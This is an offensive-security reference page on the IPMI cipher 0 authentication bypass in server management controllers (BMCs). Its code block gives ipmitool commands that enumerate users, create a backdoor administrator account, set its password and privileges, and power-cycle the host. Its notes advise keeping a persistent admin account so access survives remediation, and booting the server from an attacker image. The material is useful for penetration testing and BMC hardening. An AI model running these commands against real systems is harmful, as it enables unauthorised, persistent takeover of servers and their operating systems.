---
title: "IPMI cipher 0 bypass: authentication-free BMC command execution"
description: "IPMI 2.0 defines cipher suite zero, which disables authentication and integrity for the session. BMCs that permit cipher 0 accept administrative IPMI commands from anyone with no valid credential, letting an attacker create users, read the configuration, and control host power and boot, a complete pre-authentication compromise of the management controller."
keywords:
  - ipmi cipher 0
  - cipher zero
  - bmc
  - authentication bypass
  - ipmitool
---

# IPMI cipher 0 bypass

IPMI 2.0 negotiates a cipher suite for each session, and cipher suite zero is a special value meaning no authentication and no integrity, intended only for specific local/initial-setup cases. Many BMCs nonetheless accept cipher 0 over the network, and when they do, the controller executes administrative IPMI commands from any client with no valid credential: the password sent is ignored. An attacker simply speaks IPMI with cipher 0 and performs privileged operations, creating an administrator account, reading and changing configuration, and controlling host power and boot device, a full unauthenticated takeover of the BMC and thus the server.

```bash
# detect cipher 0 acceptance
nmap -sU -p623 --script ipmi-cipher-zero <target>
# exploit with ipmitool using cipher 0 (-C 0); the password is ignored
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user list          # enumerate users
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user set name 5 attacker
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user set password 5 Passw0rd!
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' user priv 5 4        # admin
ipmitool -I lanplus -C 0 -H <bmc> -U root -P '' chassis power cycle  # control the host
```

## Exploitation notes

- `-C 0` selects cipher zero in ipmitool; because authentication is disabled, the `-U`/`-P` values are irrelevant, the commands run regardless, which is the whole bug.
- Create a persistent admin BMC account (as above) so access survives even if cipher 0 is later disabled; then use the normal authenticated interface.
- Administrative BMC control means host power, boot-device selection, console, and virtual media, enough to boot the server from an attacker image and compromise the OS, see [iDRAC and iLO](idrac-and-ilo.md) for the virtual-media step.
- This is unauthenticated and over UDP 623; a reachable BMC accepting cipher 0 is an immediate, complete compromise of the server's management plane.

## Tools

- [ipmitool](https://github.com/ipmitool/ipmitool)
- [nmap ipmi-cipher-zero](https://nmap.org/nsedoc/scripts/ipmi-cipher-zero.html)

## References

- [IPMI 2.0 cipher suites](https://www.intel.com/content/www/us/en/products/docs/servers/ipmi/ipmi-second-gen-interface-spec-v2-rev1-1.html)
- [Dan Farmer: IPMI/BMC security](http://fish2.com/ipmi/)
